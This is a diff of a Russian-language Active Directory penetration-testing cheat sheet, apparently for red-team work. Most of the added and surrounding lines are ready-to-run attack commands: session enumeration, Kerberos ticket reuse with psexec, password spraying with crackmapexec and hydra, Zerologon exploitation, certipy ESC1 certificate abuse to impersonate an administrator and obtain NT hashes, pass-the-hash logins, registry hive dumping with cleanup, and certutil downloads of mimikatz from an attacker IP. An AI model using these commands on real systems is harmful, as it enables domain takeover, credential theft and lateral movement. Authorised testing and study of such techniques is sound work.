@@ -286,8 +286,28 @@ certutil -urlcache -split -f http://10.10.14.16/mimikatz.exe C:\Windows\System32
 - DCSync (python3 secretsdump.py test.local/john:password123@10.10.10.1)
 - SamAccountNameSpoofing
 - PrinterNightmare
+- Password Spraying
 
+**Энумерация сессий** 
+Инструменты: PowerView, RSAT, ADExplorer, LdapAdmin, **DExplorer, Bloodhound, ADRecon**
+```
+netview.py -target <victim_ip> username
+netview.py domain.local/username (получить все)
 
+Get-NetLoggedon -ComputerName <servername>
+Get-NetSession -ComputerName <servername>
+Get-LoggedOnLocal -ComputerName <servername>
+Get-LastLoggedon -ComputerName <servername>
+Get-NetRDPSession -ComputerName <servername>
+```
+
+**Поиск учетных записей в Linux для Windows**
+
+```
+*.ccache может лежать в папке /tmp/ или файл *.keytab в папке /etc
+export KRB5CCNAME=/etc/john.ccache; python3 psexec.py test.local/john@<victim_ip> -k -no-pass
+
+```
 
 **Поиск Gpp** 
 ```
@@ -334,7 +354,15 @@ ls|prompt no|mget * .|
 
 wget -m ftp://anonymous:anonymous@hostname
 ```
-# Zerologon
+
+**Password Spraying**
+```
+crackmapexec <Service> <IP> -u <UserList> -p <PasswordList>
+hydra -L <userList> -P <PasswordList> <Service>://<IP> -v -I 
+
+```
+
+**Zerologon**
 
 ```
 msf6> use auxiliary/admin/dcerpc/cve_2020_1472_zerologon (set ACTION RESTORE -> set PASSWORD <$MACHINE.ACC hex password>)
@@ -353,8 +381,21 @@ reg save HKLM\SECURITY security.save
 del /f system.save security.save sam.save
 impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
 ```
+**Certify**
 
-# SMB
+Запрос сертификата по шаблону создания сертификата для другого пользователя:
+```
+certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC1-Test -upn administrator@corp.local -dns dc.corp.local
+```
+Запрос TGT и получение NT хеша с использованием полученного ранее сертификата:
+
+```
+certipy auth -pfx administrator_dc.pfx -dc-ip 172.16.126.128
+evil-winrm -i <IP> -u <User> -H <NThash> || crackmapexec smb <IP> -u <User> -H <NTLM>
+
+```
+
+**SMB**
 Шары
 
 ```
@@ -363,18 +404,25 @@ crackmapexec smb inv1.trust.localhost -u shut -p nik123 -d trust.localhost --put
 wmic /node:alloc.trust.localhost /user:'trust.localhost\shut' /password:nik123 share list \\172.16.1.1
 enum4linux -a -u shut -p nik123 -w trust.localhost alloc.trust.localhost
 ```
-## Подбор пароля:
+**Подбор пароля**
 
 ```
 hydra -L ~/wordlists/user.txt -P ~/wordlists/pass.txt <victim_ip> smb -V
 ```
 
-## Монтирование шары:
+**Монтирование шары**
 ```
 sudo apt install cifs-utils && sudo mkdir /mnt/win_share && sudo mount -t cifs -o username=shut //nas.trust.localhost/WORK/logs /mnt/win_share
 ```
+**Скачать файл**
+```
+certutil -urlcache -f -split https://live.sysinternals.com/PsExec64.exe
+или
+certutil -VerifyCTL -f -split https://live.sysinternals.com/PsExec64.exe
 
-## Получить хеш файла
+```
+
+**Получить хеш файла**
 Windows
 ```
 Echo 'Certutil -hashfile %1 MD5' >>C:\md5.bat
